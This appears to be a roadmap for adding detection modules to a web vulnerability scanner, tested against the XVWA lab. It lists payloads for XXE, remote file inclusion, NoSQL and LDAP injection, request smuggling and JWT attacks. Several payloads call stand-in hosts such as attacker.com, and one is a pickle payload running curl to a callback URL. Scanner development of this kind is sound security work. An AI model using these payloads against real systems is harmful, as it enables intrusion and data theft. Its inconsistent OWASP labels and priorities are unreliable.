# Top 10 Web Vulnerabilities to Add as New Modules

Generated: 2025-11-12
Based on: OWASP Top 10 2025, XVWA gap analysis, industry research

---

## Priority Matrix

| Priority | Module | OWASP 2025 | Severity | Implementation |
|----------|--------|------------|----------|----------------|
| 1 | XXE Injection | A05 (Injection) | Critical | Medium |
| 2 | Remote File Inclusion (RFI) | A05 (Injection) | Critical | Easy |
| 3 | NoSQL Injection | A05 (Injection) | Critical | Medium |
| 4 | LDAP Injection | A05 (Injection) | High | Easy |
| 5 | Session Management | A07 (Auth Failures) | High | Medium |
| 6 | Insecure Deserialization | A08 (Software/Data Integrity) | Critical | Hard |
| 7 | GraphQL Injection | A05 (Injection) | High | Medium |
| 8 | HTTP Request Smuggling | A01 (Broken Access) | High | Hard |
| 9 | JWT Vulnerabilities | A07 (Auth Failures) | High | Medium |
| 10 | Race Conditions | A04 (Insecure Design) | Medium | Hard |

---

## 1. XXE (XML External Entity) Injection

**Priority:** CRITICAL (Missing from current scanner)

### Description
XXE allows attackers to interfere with XML processing, leading to file disclosure, SSRF, RCE, and DoS attacks.

### Why Important
- OWASP A05:2021 (Injection category)
- Can lead to complete system compromise
- Present in XVWA but not detected by Dominator
- Common in SOAP APIs, document parsers, RSS feeds

### Detection Techniques
1. **Classic XXE** - Direct entity injection
2. **Blind XXE** - Out-of-band data exfiltration
3. **Error-based XXE** - Trigger verbose errors
4. **XXE via file upload** - SVG, DOCX, XLSX files
5. **XInclude attacks** - Partial XML control

### Payloads (50+ needed)
```xml
<!-- Basic file disclosure -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- OOB exfiltration -->
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
]>

<!-- Error-based -->
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>

<!-- XInclude -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></root>

<!-- SVG XXE -->
<svg xmlns="http://www.w3.org/2000/svg">
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<text>&xxe;</text></svg>

<!-- SOAP XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<SOAP-ENV:Envelope>
<SOAP-ENV:Body><foo>&xxe;</foo></SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

### Detection Logic
- Test XML parameters with DOCTYPE declarations
- Check Content-Type: application/xml, text/xml
- Test file uploads (SVG, DOCX, XLSX, XML)
- Monitor for OOB callbacks
- Look for error messages revealing paths

### XVWA Test Case
- URL: `/xvwa/vulnerabilities/xxe/`
- Method: POST with XML payload

### CWE/OWASP
- **CWE:** CWE-611 (Improper Restriction of XML External Entity Reference)
- **OWASP:** A05:2021 - Security Misconfiguration
- **CVSS:** 9.1 (Critical)

### Implementation Estimate
- **Time:** 8-12 hours
- **Complexity:** Medium
- **Dependencies:** OOB detector integration

---

## 2. Remote File Inclusion (RFI)

**Priority:** CRITICAL (Missing from current scanner)

### Description
RFI allows attackers to include remote files via user input, leading to RCE, data theft, and website defacement.

### Why Important
- Direct path to RCE
- Common in PHP applications
- Present in XVWA
- Often found with LFI

### Detection Techniques
1. **HTTP inclusion** - Include external PHP file
2. **FTP inclusion** - Use FTP protocol
3. **SMB inclusion** - Windows UNC paths
4. **Data wrapper** - Base64 encoded payloads
5. **OOB detection** - Callback to attacker server

### Payloads (30+ needed)
```
# Basic RFI
?page=http://attacker.com/shell.txt
?file=https://evil.com/backdoor.php
?include=http://malicious.site/cmd.txt

# Protocol variations
?page=ftp://attacker.com/shell.php
?file=//attacker.com/share/evil.php
?inc=\\attacker.com\share\shell.txt

# With null byte (older PHP)
?page=http://attacker.com/shell.txt%00
?file=http://evil.com/cmd.php%00.jpg

# Data wrapper
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Expect wrapper
?page=expect://id
?file=expect://whoami

# Input wrapper
?page=php://input (POST: <?php system('id'); ?>)

# OOB detection
?page=http://requestbin.cn/xxxxx/rfi_test.txt
?file=http://CALLBACK_URL/probe.php
```

### Detection Logic
- Test parameters with remote URLs
- Check for callback to OOB service
- Look for URL wrappers: http://, https://, ftp://
- Test with different protocols
- Monitor response for remote content

### XVWA Test Case
- URL: `/xvwa/vulnerabilities/rfi/`
- Parameter: `page`

### CWE/OWASP
- **CWE:** CWE-98 (PHP Remote File Inclusion)
- **OWASP:** A05:2021 - Injection
- **CVSS:** 9.8 (Critical)

### Implementation Estimate
- **Time:** 4-6 hours
- **Complexity:** Easy
- **Dependencies:** OOB detector, HTTP client

---

## 3. NoSQL Injection

**Priority:** CRITICAL (Growing threat, not detected)

### Description
NoSQL injection exploits vulnerabilities in MongoDB, CouchDB, Firebase, and other NoSQL databases through unsanitized JSON queries.

### Why Important
- OWASP A05:2021 (Injection)
- Growing with microservices adoption
- Different from SQL injection
- Can bypass authentication, extract data

### Detection Techniques
1. **JSON injection** - MongoDB operators
2. **JavaScript injection** - $where clauses
3. **Timing attacks** - Sleep functions
4. **Boolean-based** - True/false conditions
5. **Authentication bypass** - Login circumvention

### Payloads (40+ needed)
```javascript
// MongoDB operator injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"$or": [{"username": "admin"}, {"username": "administrator"}]}

// $where injection
{"$where": "sleep(5000)"}
{"$where": "this.username == 'admin' || '1'=='1'"}
{"$where": "function() { return true; }"}

// Authentication bypass
username[$ne]=admin&password[$ne]=pass
{"username": {"$nin": []}, "password": {"$nin": []}}

// Data exfiltration
{"username": {"$regex": "^a.*"}}  // Starts with 'a'
{"email": {"$regex": ".*@admin.*"}}

// JavaScript injection
' || 'a'=='a
' && this.password.match(/^a.*/)//
'; return true; var foo='

// Timing-based
{"$where": "sleep(5000) || true"}
username=admin'%26%26sleep(5000)%26%26'1

// Array injection
username[]=admin&password[]=pass
{"username": ["admin"], "password": ["pass"]}
```

### Detection Logic
- Test JSON parameters with NoSQL operators
- Try authentication bypass payloads
- Test timing attacks for blind injection
- Look for MongoDB error messages
- Test Content-Type: application/json endpoints

### Target Applications
- MongoDB, CouchDB, Firebase
- REST APIs with JSON input
- Node.js/Express applications
- GraphQL endpoints

### CWE/OWASP
- **CWE:** CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)
- **OWASP:** A05:2021 - Injection
- **CVSS:** 8.6 (High)

### Implementation Estimate
- **Time:** 8-10 hours
- **Complexity:** Medium
- **Dependencies:** JSON handling, timing detection

---

## 4. LDAP Injection

**Priority:** HIGH (Enterprise applications)

### Description
LDAP injection manipulates LDAP queries to access unauthorized directory information, bypass authentication, or modify directory data.

### Why Important
- OWASP A05:2021 (Injection)
- Common in enterprise applications
- Active Directory exploitation
- Authentication bypass

### Detection Techniques
1. **Filter injection** - Modify search filters
2. **Authentication bypass** - Login circumvention
3. **Blind injection** - Boolean/timing based
4. **AND/OR operators** - Logic manipulation
5. **Wildcard injection** - Universal matching

### Payloads (25+ needed)
```
# Authentication bypass
*
*)(&
*)(uid=*))(|(uid=*
admin)(&(password=*))
*)(|(password=*

# OR injection
*)(|(cn=*))
*)(objectClass=*)
admin*

# AND injection
*)(cn=admin))(&(password=*
*))%00

# Wildcard attacks
*
**
***
a*
*admin*

# Boolean-based
admin)(&(password=*))
admin)(|(password=*
*)(uid=admin))(|(uid=*

# Timing attacks (if supported)
admin)(&(|(password=*)(sleep(5)))
```

### Detection Logic
- Test username/password fields with LDAP metacharacters
- Try authentication bypass patterns
- Look for LDAP error messages
- Test filters with wildcards
- Monitor response time differences

### Common Targets
- Corporate intranets
- Active Directory authentication
- Email systems
- VPN login portals

### CWE/OWASP
- **CWE:** CWE-90 (Improper Neutralization of Special Elements in LDAP Query)
- **OWASP:** A05:2021 - Injection
- **CVSS:** 8.1 (High)

### Implementation Estimate
- **Time:** 4-6 hours
- **Complexity:** Easy
- **Dependencies:** None

---

## 5. Session Management Vulnerabilities

**Priority:** HIGH (Missing from current scanner)

### Description
Session management flaws include session fixation, session hijacking, predictable session IDs, and insecure session handling.

### Why Important
- OWASP A07:2021 (Identification and Authentication Failures)
- Present in XVWA
- Can lead to account takeover
- Often overlooked

### Detection Techniques
1. **Session fixation** - Force session ID
2. **Weak session IDs** - Predictability analysis
3. **Session timeout** - Expired session handling
4. **Cookie security** - Missing flags
5. **Session hijacking** - Token theft

### Tests to Implement
```python
# Session fixation
1. Get initial session ID
2. Login with forced session ID
3. Check if session ID changes

# Weak session IDs
1. Collect 100+ session IDs
2. Analyze entropy
3. Check for patterns/sequences

# Cookie flags
- Missing Secure flag
- Missing HttpOnly flag
- Missing SameSite attribute
- Overly permissive Domain/Path

# Session timeout
1. Login and get session
2. Wait extended period
3. Check if session still valid

# Logout functionality
1. Login and capture session
2. Logout
3. Try using old session token
```

### Detection Logic
- Analyze Set-Cookie headers
- Test session fixation scenarios
- Collect and analyze session ID patterns
- Check cookie security attributes
- Test session persistence after logout

### XVWA Test Case
- URL: `/xvwa/vulnerabilities/sessions/`
- Various session management flaws

### CWE/OWASP
- **CWE:** CWE-384 (Session Fixation), CWE-330 (Weak Random), CWE-613 (Insufficient Session Expiration)
- **OWASP:** A07:2021 - Authentication Failures
- **CVSS:** 8.1 (High)

### Implementation Estimate
- **Time:** 10-12 hours
- **Complexity:** Medium
- **Dependencies:** Session tracking, statistical analysis

---

## 6. Insecure Deserialization

**Priority:** HIGH (Critical impact)

### Description
Insecure deserialization allows attackers to execute arbitrary code by crafting malicious serialized objects.

### Why Important
- OWASP A08:2021 (Software and Data Integrity Failures)
- Direct path to RCE
- Common in Java, Python, PHP, Ruby
- Often unauthenticated

### Detection Techniques
1. **PHP object injection** - Unserialize() exploitation (already exists)
2. **Java deserialization** - Commons Collections gadgets
3. **Python pickle** - __reduce__ exploitation
4. **Ruby Marshal** - Deserialization RCE
5. **.NET deserialization** - BinaryFormatter exploitation

### Payloads by Language

**Java (ysoserial gadgets):**
```
CommonsCollections1-7
Spring1-2
Groovy1
Jdk7u21
FileUpload1
```

**Python pickle:**
```python
import pickle
import base64
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('curl http://CALLBACK_URL',))

payload = base64.b64encode(pickle.dumps(RCE()))
```

**.NET:**
```xml
<ObjectDataProvider MethodName="Start">
  <ObjectInstance>
    <Process><StartInfo><FileName>cmd</FileName>
```

### Detection Logic
- Identify serialized data patterns (base64, hex)
- Test with gadget chains
- Monitor for OOB callbacks
- Look for error messages revealing classes
- Test Content-Type with serialized formats

### CWE/OWASP
- **CWE:** CWE-502 (Deserialization of Untrusted Data)
- **OWASP:** A08:2021 - Software/Data Integrity
- **CVSS:** 9.8 (Critical)

### Implementation Estimate
- **Time:** 12-16 hours
- **Complexity:** Hard
- **Dependencies:** Gadget chain libraries, OOB detector

---

## 7. GraphQL Injection & Vulnerabilities

**Priority:** HIGH (Modern APIs)

### Description
GraphQL vulnerabilities include injection, introspection leakage, batching attacks, and DoS through complex queries.

### Why Important
- Growing adoption in modern apps
- Unique attack surface
- Different from REST APIs
- Can expose entire schema

### Detection Techniques
1. **Introspection** - Schema disclosure
2. **Injection** - Query manipulation
3. **Batching attacks** - Rate limit bypass
4. **Query depth** - DoS attacks
5. **Field suggestions** - Enumeration

### Payloads
```graphql
# Introspection query
{__schema{types{name,fields{name}}}}

# Query suggestions (typo)
{usre{id,name,email}}
# Response: "Did you mean 'user'?"

# Batching attack
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  ... (repeat 1000x)
]

# Circular query (DoS)
{
  users {
    posts {
      author {
        posts {
          author {
            posts { ... }
          }
        }
      }
    }
  }
}

# Alias-based enumeration
{
  user1: user(id: 1) { name }
  user2: user(id: 2) { name }
  ... (repeat 1000x)
}

# Directive abuse
query @skip(if: true) { sensitive_data }
```

### Detection Logic
- Detect GraphQL endpoints (/graphql, /api/graphql)
- Test introspection queries
- Send malformed queries for suggestions
- Test batching capabilities
- Check for query depth limits

### CWE/OWASP
- **CWE:** CWE-943 (Injection), CWE-209 (Information Exposure)
- **OWASP:** A05:2021 - Injection, A01:2021 - Broken Access Control
- **CVSS:** 7.5 (High)

### Implementation Estimate
- **Time:** 8-10 hours
- **Complexity:** Medium
- **Dependencies:** GraphQL query parser

---

## 8. HTTP Request Smuggling

**Priority:** MEDIUM (Advanced attack)

### Description
HTTP request smuggling exploits inconsistencies in how front-end and back-end servers parse HTTP requests.

### Why Important
- OWASP A01:2021 (Broken Access Control)
- Can bypass security controls
- Cache poisoning potential
- Gaining momentum in research

### Detection Techniques
1. **CL.TE** - Content-Length vs Transfer-Encoding
2. **TE.CL** - Transfer-Encoding vs Content-Length
3. **TE.TE** - Obfuscated Transfer-Encoding
4. **CL.CL** - Duplicate Content-Length

### Detection Payloads
```http
# CL.TE detection
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X

# TE.CL detection
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


# Timing-based detection
Send two requests, measure timing difference
```

### Detection Logic
- Test different header combinations
- Use timing analysis
- Look for response splitting
- Test with various encodings
- Monitor for unusual responses

### CWE/OWASP
- **CWE:** CWE-444 (HTTP Request Smuggling)
- **OWASP:** A01:2021 - Broken Access Control
- **CVSS:** 7.5 (High)

### Implementation Estimate
- **Time:** 16-20 hours
- **Complexity:** Hard
- **Dependencies:** Advanced HTTP client, timing analysis

---

## 9. JWT (JSON Web Token) Vulnerabilities

**Priority:** HIGH (Authentication systems)

### Description
JWT vulnerabilities include algorithm confusion, weak secrets, token tampering, and improper validation.

### Why Important
- OWASP A07:2021 (Authentication Failures)
- Widely used for authentication
- Multiple attack vectors
- Can lead to privilege escalation

### Detection Techniques
1. **None algorithm** - Remove signature
2. **Algorithm confusion** - RS256 to HS256
3. **Weak secret** - Brute force key
4. **Kid injection** - Key ID manipulation
5. **JKU injection** - JWK Set URL manipulation

### Test Cases
```python
# None algorithm bypass
{
  "alg": "none",
  "typ": "JWT"
}
{
  "sub": "admin",
  "role": "administrator"
}

# Algorithm confusion (RS256 -> HS256)
# Sign with public key as HMAC secret

# Weak secret detection
# Try common secrets: secret, password, 123456

# Kid path traversal
"kid": "../../../../../../dev/null"
"kid": "/etc/passwd"

# JKU injection
"jku": "http://attacker.com/jwks.json"

# SQL injection in kid
"kid": "' OR '1'='1"

# Token tampering
# Modify payload without re-signing
```

### Detection Logic
- Identify JWT tokens (Authorization: Bearer)
- Test algorithm confusion
- Try weak secrets dictionary
- Test kid/jku injection
- Attempt signature removal

### CWE/OWASP
- **CWE:** CWE-347 (Improper Verification of Cryptographic Signature)
- **OWASP:** A07:2021 - Authentication Failures
- **CVSS:** 8.1 (High)

### Implementation Estimate
- **Time:** 8-10 hours
- **Complexity:** Medium
- **Dependencies:** JWT library, crypto functions

---

## 10. Race Conditions & TOCTOU

**Priority:** MEDIUM (Complex to exploit)

### Description
Race conditions occur when application logic depends on timing, allowing attackers to exploit the time gap between checking and using a resource.

### Why Important
- OWASP A04:2021 (Insecure Design)
- Can bypass payment systems
- Duplicate critical operations
- Often missed in testing

### Detection Techniques
1. **Limit bypass** - Parallel requests to exceed limits
2. **Double spending** - Duplicate financial transactions
3. **Coupon reuse** - Apply discount multiple times
4. **Account creation** - Register duplicate usernames
5. **File operations** - TOCTOU in file handling

### Test Scenarios
```python
# Limit bypass test
def test_rate_limit_race():
    # Send 100 parallel requests
    # Check if limit can be exceeded

# Double spending
def test_payment_race():
    # Make payment request
    # Simultaneously make another payment
    # Check if balance allows both

# Coupon reuse
def test_coupon_race():
    # Apply same coupon code
    # Send 10 parallel checkout requests
    # Check if discount applied multiple times

# Username uniqueness
def test_registration_race():
    # Register same username
    # Send 5 parallel registration requests
    # Check for duplicate accounts
```

### Detection Logic
- Identify state-changing operations
- Send parallel/rapid requests
- Check for unexpected duplicate operations
- Monitor response timing
- Validate atomic operation failures

### CWE/OWASP
- **CWE:** CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization), CWE-367 (TOCTOU)
- **OWASP:** A04:2021 - Insecure Design
- **CVSS:** 6.5 (Medium)

### Implementation Estimate
- **Time:** 12-16 hours
- **Complexity:** Hard
- **Dependencies:** Threading/async support, timing precision

---

## Implementation Roadmap

### Phase 1: Critical Gaps (1-2 weeks)
1. XXE Injection (12 hours)
2. Remote File Inclusion (6 hours)
3. NoSQL Injection (10 hours)

### Phase 2: High Priority (2-3 weeks)
4. LDAP Injection (6 hours)
5. Session Management (12 hours)
6. JWT Vulnerabilities (10 hours)
7. GraphQL Injection (10 hours)

### Phase 3: Advanced Detection (3-4 weeks)
8. Insecure Deserialization (16 hours)
9. HTTP Request Smuggling (20 hours)
10. Race Conditions (16 hours)

### Total Estimate
- **Time:** 118 hours (≈15 business days)
- **Priority modules (1-4):** 34 hours (≈4-5 days)
- **All modules:** 3-4 weeks with single developer

---

## Summary Statistics

| Category | Count | Total Payloads | Avg Complexity |
|----------|-------|----------------|----------------|
| Injection | 4 | 145+ | Medium |
| Authentication | 2 | 60+ | Medium |
| Data Integrity | 1 | 20+ | Hard |
| Design Flaws | 2 | 40+ | Hard |
| Access Control | 1 | 15+ | Hard |

**Total Payloads Needed:** 280+
**Total Implementation Time:** 118 hours
**Coverage Improvement:** +29.2% (70.8% → 100% XVWA coverage)

---

## Next Steps

1. **Immediate:** Implement XXE, RFI, NoSQL, LDAP (Priority 1-4)
2. **Week 2:** Session Management, JWT (Priority 5, 9)
3. **Week 3:** GraphQL, Insecure Deserialization (Priority 6, 7)
4. **Week 4:** HTTP Request Smuggling, Race Conditions (Priority 8, 10)
5. **Testing:** Validate all modules against XVWA, DVWA, PortSwigger Academy labs

**Goal:** Achieve 100% XVWA coverage and match/exceed Burp Suite Community detection capabilities.
